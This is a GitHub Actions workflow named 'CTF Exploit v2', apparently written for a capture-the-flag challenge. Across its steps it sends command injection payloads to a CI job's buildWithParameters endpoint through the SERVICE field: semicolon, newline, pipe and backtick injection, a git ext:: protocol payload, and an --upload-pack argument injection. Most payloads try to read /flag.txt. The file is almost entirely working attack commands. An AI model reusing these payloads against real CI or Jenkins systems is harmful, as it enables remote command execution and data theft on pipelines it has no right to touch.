name: CTF Exploit v2
on:
  push:
    branches: [ master ]
  workflow_dispatch:

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Get buildWithParameters form
        run: |
          echo "=== GET /job/deploy-service/buildWithParameters ==="
          curl -sk https://gitops.ctfchile.com/job/deploy-service/buildWithParameters
          echo ""
          echo "=== GET /job/deploy-service ==="
          curl -sk https://gitops.ctfchile.com/job/deploy-service

      - name: Exploit - bash injection via service param
        run: |
          echo "=== PAYLOAD 1: semicolon injection ==="
          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
            --data-urlencode 'SERVICE=test; cat /flag.txt' | grep -E "flag|CTF|output|result|error|clone" | head -30
          echo ""
          echo "=== PAYLOAD 2: newline injection ==="
          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
            -d 'SERVICE=test%0acat+/flag.txt' | grep -E "flag|CTF|output|result" | head -30
          echo ""
          echo "=== PAYLOAD 3: pipe injection ==="
          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
            --data-urlencode 'SERVICE=test | cat /flag.txt' | grep -E "flag|CTF|output|result" | head -30
          echo ""
          echo "=== PAYLOAD 4: backtick injection ==="
          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
            --data-urlencode 'SERVICE=`cat /flag.txt`' | grep -E "flag|CTF|output|result" | head -30

      - name: Exploit - ext protocol
        run: |
          echo "=== PAYLOAD 5: ext:: protocol ==="
          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
            --data-urlencode 'SERVICE=ext::sh -c cat /flag.txt >&2' | head -50
          echo ""
          echo "=== PAYLOAD 6: --upload-pack injection ==="
          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
            --data-urlencode 'SERVICE=--upload-pack=touch /tmp/pwned https://github.com/chilectf/exploit' | head -50

      - name: Full response - PAYLOAD 1
        run: |
          echo "=== FULL RESPONSE semicolon ==="
          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
            --data-urlencode 'SERVICE=x; cat /flag.txt'